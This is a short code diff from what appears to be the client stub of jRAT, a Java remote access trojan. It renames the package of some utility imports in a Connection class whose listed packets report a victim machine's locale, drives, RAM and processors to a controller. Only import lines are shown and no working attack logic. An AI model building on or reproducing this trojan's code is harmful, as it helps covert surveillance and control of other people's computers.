@@ -11,6 +11,11 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.util.Locale;
 
+import pro.jrat.common.OperatingSystem;
+import pro.jrat.common.Version;
+import pro.jrat.common.codec.Hex;
+import pro.jrat.common.crypto.Crypto;
+import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
@@ -32,11 +37,6 @@ import pro.jrat.stub.packets.outgoing.Packet62InitDrives;
 import pro.jrat.stub.packets.outgoing.Packet63InitRAM;
 import pro.jrat.stub.packets.outgoing.Packet64InitAvailableProcessors;
 
-import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.common.Version;
-import com.redpois0n.common.codec.Hex;
-import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.common.io.StringWriter;
 import com.sun.management.OperatingSystemMXBean;
 
 public class Connection implements Runnable {
